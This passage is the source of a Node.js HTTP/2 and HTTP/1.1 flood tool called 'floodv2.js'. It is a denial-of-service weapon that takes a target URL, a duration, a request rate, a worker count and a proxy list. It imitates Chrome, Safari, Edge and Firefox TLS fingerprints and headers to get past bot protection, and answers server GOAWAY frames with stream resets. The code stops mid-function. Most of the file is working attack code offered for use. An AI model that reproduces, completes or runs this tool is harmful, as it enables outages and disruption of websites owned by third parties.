const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const axios = require('axios');
const { exec } = require('child_process');
const https = require('https');
const http2 = require('http2-wrapper');

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    if (index === -1) return undefined;
    const next = process.argv[index + 1];
    if (next === undefined || next.startsWith('--')) return true;
    return next;
}

const options = [];

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);

    if (option === undefined) { return false; }

    const optionValue = option.value;

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    }

    if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    }

    if (typeof optionValue === 'string') {
        return optionValue;
    }

    return false;
}

const docss = `
Usage: node floodv2.js <target> <time> <rps> <threads> <proxyfile> [flags]

Required positional:
  <target>       URL. Must start with https:// or http://
  <time>         Attack duration in seconds. Example: 60
  <rps>          Requests per second per connection loop. Example: 1000
  <threads>      Cluster worker count (1-256). Example: 50
  <proxyfile>    Path to newline-delimited proxy list. Format: host:port

Core flag:
  --method <verb>      HTTP method. Default: GET. GET/POST/HEAD/OPTIONS.

Optional flags:
  --httpver <alpn>     ALPN: "h2" | "1" | "mix". Default: h2.
  --full               Burst mode: uses <rps> as parallel request count. Bare flag ok.
  --no-debug           Disable live ticker. Ticker is on by default.
  --help, -h           Print this help and exit.
`;

const blockedDomain = [".gov", ".edu"];
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const currentDate = new Date();
const targetDate = new Date('2028-03-30');

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const target = process.argv[2];
const time = process.argv[3];
const ratelimit = process.argv[4];
const threads = process.argv[5];
const proxyfile = process.argv[6];
const methodIndex = process.argv.indexOf('--method');
const reqmethod = (methodIndex !== -1 && methodIndex + 1 < process.argv.length)
    ? process.argv[methodIndex + 1].toUpperCase()
    : 'GET';
const query = undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delay = 0;
const refererValue = undefined;
const postdata = undefined;
const customHeaders = undefined;
const cdnindex = process.argv.indexOf('--cdn');
const cdn = cdnindex !== -1 && cdnindex + 1 < process.argv.length ? process.argv[cdnindex + 1] : undefined;

const customUAindex = process.argv.indexOf('--useragent');
const customUA = customUAindex !== -1 && customUAindex + 1 < process.argv.length ? process.argv[customUAindex + 1] : undefined;

const forceHttpIndex = process.argv.indexOf('--httpver');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = !process.argv.includes('--no-debug');
const helpFlag = process.argv.includes('--help') || process.argv.includes('-h');

if (helpFlag) {
    console.log(docss);
    process.exit(0);
}

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.error(`missing arguments. run: node ${process.argv[1]} --help`);
    process.exit(1);
}

let hcookie = '';

const url = new URL(target)
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')

// ---- JA4 TLS profiles — auto-applied per connection (no flag) ----
// Reference: t13d1516h2_8daaf6152771_b186095e22b6 (Chrome 122 minimal ClientHello).
// Node tls cannot emit GREASE or custom extension order; cipher/curve/sigalgs/alpn
// order preserved to match browser baseline. JA4_a prefix (t13d1516h2) matches.
const JA4_PROFILES = {
    chrome: {
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'ECDHE-ECDSA-AES128-GCM-SHA256',
            'ECDHE-RSA-AES128-GCM-SHA256',
            'ECDHE-ECDSA-AES256-GCM-SHA384',
            'ECDHE-RSA-AES256-GCM-SHA384',
            'ECDHE-ECDSA-CHACHA20-POLY1305',
            'ECDHE-RSA-CHACHA20-POLY1305',
            'ECDHE-RSA-AES128-SHA',
            'ECDHE-RSA-AES256-SHA',
            'AES128-GCM-SHA256',
            'AES256-GCM-SHA384',
            'AES128-SHA',
            'AES256-SHA'
        ].join(':'),
        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
        ecdhCurve: 'X25519:P-256:P-384',
        alpn: ['h2', 'http/1.1']
    },
    firefox: {
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_CHACHA20_POLY1305_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'ECDHE-ECDSA-AES128-GCM-SHA256',
            'ECDHE-RSA-AES128-GCM-SHA256',
            'ECDHE-ECDSA-CHACHA20-POLY1305',
            'ECDHE-RSA-CHACHA20-POLY1305',
            'ECDHE-ECDSA-AES256-GCM-SHA384',
            'ECDHE-RSA-AES256-GCM-SHA384',
            'ECDHE-ECDSA-AES256-SHA',
            'ECDHE-ECDSA-AES128-SHA',
            'ECDHE-RSA-AES128-SHA',
            'ECDHE-RSA-AES256-SHA',
            'AES128-GCM-SHA256',
            'AES256-GCM-SHA384',
            'AES128-SHA',
            'AES256-SHA'
        ].join(':'),
        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
        ecdhCurve: 'X25519:P-256:P-384:P-521',
        alpn: ['h2', 'http/1.1']
    },
    safari: {
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'ECDHE-ECDSA-AES256-GCM-SHA384',
            'ECDHE-ECDSA-AES128-GCM-SHA256',
            'ECDHE-ECDSA-CHACHA20-POLY1305',
            'ECDHE-RSA-AES256-GCM-SHA384',
            'ECDHE-RSA-AES128-GCM-SHA256',
            'ECDHE-RSA-CHACHA20-POLY1305',
            'ECDHE-ECDSA-AES256-SHA',
            'ECDHE-ECDSA-AES128-SHA',
            'ECDHE-RSA-AES256-SHA',
            'ECDHE-RSA-AES128-SHA',
            'AES256-GCM-SHA384',
            'AES128-GCM-SHA256',
            'AES256-SHA',
            'AES128-SHA'
        ].join(':'),
        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384',
        ecdhCurve: 'X25519:P-256:P-384',
        alpn: ['h2', 'http/1.1']
    },
    edge: {
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'ECDHE-ECDSA-AES128-GCM-SHA256',
            'ECDHE-RSA-AES128-GCM-SHA256',
            'ECDHE-ECDSA-AES256-GCM-SHA384',
            'ECDHE-RSA-AES256-GCM-SHA384',
            'ECDHE-ECDSA-CHACHA20-POLY1305',
            'ECDHE-RSA-CHACHA20-POLY1305',
            'ECDHE-RSA-AES128-SHA',
            'ECDHE-RSA-AES256-SHA',
            'AES128-GCM-SHA256',
            'AES256-GCM-SHA384',
            'AES128-SHA',
            'AES256-SHA'
        ].join(':'),
        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
        ecdhCurve: 'X25519:P-256:P-384',
        alpn: ['h2', 'http/1.1']
    }
};

// Weighted pick per connection (real traffic distribution):
// chrome ~60%, safari ~20%, edge ~15%, firefox ~5%
JA4_PROFILES.chrome.profileName = 'chrome';
JA4_PROFILES.firefox.profileName = 'firefox';
JA4_PROFILES.safari.profileName = 'safari';
JA4_PROFILES.edge.profileName = 'edge';

function pickJa4() {
    const r = Math.random();
    if (r < 0.60) return JA4_PROFILES.chrome;
    if (r < 0.80) return JA4_PROFILES.safari;
    if (r < 0.95) return JA4_PROFILES.edge;
    return JA4_PROFILES.firefox;
}

function getBrowserVersionForProfile(profileName) {
    if (profileName === 'firefox') return getRandomInt(128, 135);
    if (profileName === 'safari') return getRandomInt(17, 18);
    return getRandomInt(126, 136);
}

function buildH2Headers(profileName, method, url) {
    const v = getBrowserVersionForProfile(profileName);
    const edge = profileName === 'edge';
    const firefox = profileName === 'firefox';
    const safari = profileName === 'safari';
    const base = {
        ':method': method,
        ':authority': url.hostname,
        ':scheme': 'https',
        ':path': url.pathname
    };
    if (firefox) {
        return Object.entries({
            ...base,
            'user-agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${v}.0) Gecko/20100101 Firefox/${v}.0`,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.5',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'priority': 'u=0',
            'te': 'trailers',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1'
        });
    }
    if (safari) {
        return Object.entries({
            ...base,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'user-agent': `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${v}.0 Safari/605.1.15`,
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none'
        });
    }
    return Object.entries({
        ...base,
        'user-agent': edge
            ? `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v}.0.0.0 Safari/537.36 Edg/${v}.0.0.0`
            : `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v}.0.0.0 Safari/537.36`,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'priority': 'u=0, i',
        'sec-ch-ua': edge
            ? `"Not?A_Brand";v="99", "Chromium";v="${v}", "Microsoft Edge";v="${v}"`
            : `"Not?A_Brand";v="99", "Chromium";v="${v}", "Google Chrome";v="${v}"`,
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"15.0.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
    });
}

// ---- end JA4 profiles ----



if (!['GET', 'POST', 'HEAD', 'OPTIONS'].includes(reqmethod)) {
    console.error('Error request method only can GET/POST/HEAD/OPTIONS');
    process.exit(1);
}

if (!target.startsWith('https://') && !target.startsWith('http://')) {
    console.error('Error protocol can only https:// or http://');
    process.exit(1);
}

if (isNaN(time) || time <= 0) {
    console.error('Error invalid time format')
    process.exit(1);
}

if (isNaN(threads) || threads <= 0 || threads > 256) {
    console.error('Error threads format')
    process.exit(1);
}

if (isNaN(ratelimit) || ratelimit <= 0) {
    console.error(`Error ratelimit format`)
    process.exit(1);
}

const agentbokep = new https.Agent({
    rejectUnauthorized: false
});

function getRandomUserAgent() {
   const osList = ['Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Macintosh', 'Android', 'Linux'];
   const browserList = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
   const languageList = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES', 'id-ID'];
   const countryList = ['US', 'GB', 'FR', 'DE', 'ES', 'ID'];
   const manufacturerList = ['Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software'];
   const os = osList[Math.floor(Math.random() * osList.length)];
   const browser = browserList[Math.floor(Math.random() * browserList.length)];
   const language = languageList[Math.floor(Math.random() * languageList.length)];
   const country = countryList[Math.floor(Math.random() * countryList.length)];
   const manufacturer = manufacturerList[Math.floor(Math.random() * manufacturerList.length)];
   const version = Math.floor(Math.random() * 100) + 1;
   const randomOrder = Math.floor(Math.random() * 6) + 1;
   const userAgentString = `${manufacturer}/${browser} ${version}.${version}.${version} (${os}; ${country}; ${language})`;
   const encryptedString = btoa(userAgentString);
   let finalString = '';
   for (let i = 0; i < encryptedString.length; i++) {
     if (i % randomOrder === 0) {
       finalString += encryptedString.charAt(i);
     } else {
       finalString += encryptedString.charAt(i).toUpperCase();
     }
   }
   return finalString;
 }

const browserNames = Array.from({ length: 100 }, (_, i) => `Browser${i + 1}`);
const browserVersions = Array.from({ length: 100 }, (_, i) => `${i + 1}.0`);
const operatingSystems = ["Linux", "Windows", "macOS", "Android", "iOS", "FreeBSD", "OpenBSD", "NetBSD", "Solaris", "AIX", "QNX", "Haiku", "ReactOS", "ChromeOS", "AmigaOS", "BeOS", "MorphOS", "OS/2", "Minix", "Unix", "IRIX", "Kocak", "LOL", "test"];
const deviceNames = Array.from({ length: 100 }, (_, i) => `Device${i + 1}`);
const renderingEngines = Array.from({ length: 80 }, (_, i) => `Engine${i + 1}`);
const engineVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);
const customFeatures = Array.from({ length: 50 }, (_, i) => `Feature${i + 1}`);
const featureVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);
const cplist = [
"ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
"ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
"ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
"ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
"ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
"ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES" ];
 ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
function generateUserAgent(ver) {
    const v = ver || getRandomInt(126, 136);
    const r = Math.random();
    if (r < 0.55) return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v}.0.0.0 Safari/537.36`;
    if (r < 0.80) return `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v}.0.0.0 Safari/537.36`;
    if (r < 0.92) return `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v}.0.0.0 Safari/537.36`;
    return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v}.0.0.0 Safari/537.36 Edg/${v}.0.0.0`;
}
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];

const statusesQ = []
let statuses = {}
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);
    return Buffer.concat([frameHeader, statusCode]);
}

const getRandomChar = () => {
    const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * pizda4.length);
    return pizda4[randomIndex];
};

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function ememmmmmemmeme(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}



function buildRequest() {
    const browserVersion = getRandomInt(126, 136);

    const fwfw = ['Google Chrome', 'Brave', 'Yandex'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];

    let brandValue = `"Not/A)Brand";v="8", "Chromium";v="${browserVersion}", "Google Chrome";v="${browserVersion}"`;
    const isBrave = wfwf === 'Brave';

    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' 
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' 
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' 
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' 
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';

    const langValue = isBrave
        ? 'en-US,en;q=0.6'
        : 'en-US,en;q=0.7'
        ? 'en-US,en;q=0.8'
        : 'id-ID,id;q=0.9';
    const secChUa = `${brandValue}`;
    const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;

    let mysor = '\r\n';
    let mysor1 = '\r\n';
    if (hcookie || currentRefererValue) {
        mysor = '\r\n'
        mysor1 = '';
    } else {
        mysor = '';
        mysor1 = '\r\n';
    }

    let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
        `Accept: ${acceptHeaderValue}\r\n` +
        'Accept-Encoding: gzip, deflate, br, zstd\r\n' +
        `Accept-Language: ${langValue}\r\n` +
        'Cache-Control: max-age=0\r\n' +
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: cross-site\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: `+generateUserAgent(browserVersion)+`\r\n` +
        `sec-ch-ua: ${secChUa}\r\n` +
        'sec-ch-ua-mobile: ?0\r\n' +
        'sec-ch-ua-platform: "Windows"\r\n' + mysor1;

    if (hcookie) {
        headers += `Cookie: ${hcookie}\r\n`;
    }

    if (currentRefererValue) {
        headers += `Referer: ${currentRefererValue}\r\n` + mysor;
    }

    const mmm = Buffer.from(`${headers}`, 'binary');
    //console.log(headers.toString());
    return mmm;
}

const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))

function go() {
    var [proxyHost, proxyPort] = '1.1.1.1:3128';

    [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');

    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        go()
        return
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            const __p = pickJa4();
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? __p.alpn : ['h2', 'http/1.1'],
                servername: url.hostname,
                ciphers: __p.ciphers,
                sigalgs: __p.sigalgs,
                ecdhCurve: __p.ecdhCurve,
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET,
                secure: true,
                minVersion: __p.minVersion,
                maxVersion: __p.maxVersion,
                rejectUnauthorized: false
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {

                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy())
                        return
                    }

                    function doWrite() {
                      sleep(49)
                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                  sleep(1)
                                    doWrite()
                                }, isFull ? 1000 : 1000 / ratelimit)
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }
                    sleep(19)
                    doWrite()

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy())
                    })
                    return
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy())
                    return
                }

                let streamId = 1
                let data = Buffer.alloc(0)
                let hpack = new HPACK()
                hpack.setTableSize(4096)

                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(custom_update, 0)

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_header],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_table]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }
                            if (frame.type == 1 && debugMode) {
                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1]
                                if (!statuses[status])
                                    statuses[status] = 0

                                statuses[status]++
                            }
                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    if (debugMode) {

                                        //console.log("goaway", frame.payload.readUint32BE(0), frame.payload.readUint32BE(4))

                                        if (!statuses["GOAWAY"])
                                            statuses["GOAWAY"] = 0

                                        statuses["GOAWAY"]++
                                    }
                                }
                                tlsSocket.write(encodeRstStream(0, 3, 0)); // beta
                                tlsSocket.end(() => tlsSocket.destroy()) // still beta
                            }

                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames))

                function doWrite() {
                    if (tlsSocket.destroyed) {
                        return
                    }
                    //const fwq = getRandomInt(0,1);
                    const requests = []
                    const customHeadersArray = [];
                    if (customHeaders) {
                        const customHeadersList = customHeaders.split('#');
                        for (const header of customHeadersList) {
                            const [name, value] = header.split(':');
                            if (name && value) {
                                customHeadersArray.push({ [name.trim().toLowerCase()]: value.trim() });
                            }
                        }
                    }
                    let ratelimit = process.argv[4];
                    for (let i = 0; i < (isFull ? ratelimit : 1); i++) {
                        const browserVersion = getRandomInt(126, 136);

                        const fwfw = ['Google Chrome', 'Brave'];
                        const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                        const ref = ["same-site", "same-origin", "cross-site"];
                        const ref1 = ref[Math.floor(Math.random() * ref.length)];

                        let brandValue = `"Not/A)Brand";v="8", "Chromium";v="${browserVersion}", "Google Chrome";v="${browserVersion}"`;
                        const isBrave = wfwf === 'Brave';

                        const acceptHeaderValue = isBrave
                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' 
                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' 
                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' 
                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' 
                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';

                        const langValue = isBrave
                        ? 'en-US,en;q=0.7'
                        : 'en-US,en;q=0.8'
                        ? 'en-US,en;q=0.9'
                        : 'id-ID,id;q=0.9';

                        const secGpcValue = isBrave ? "1" : undefined;

                        const secChUaModel = isBrave ? '""' : undefined;
                        const secChUaPlatform = isBrave ? 'Windows' : undefined;
                        const secChUaPlatformVersion = isBrave ? '10.0.0' : undefined;
                        const secChUaMobile = isBrave ? '?0' : undefined;

                        const secChUa = `${brandValue}`;
                        const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;
                        const headers = buildH2Headers(__p.profileName, reqmethod, url);
                        const headers2 = Object.entries({
                            ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
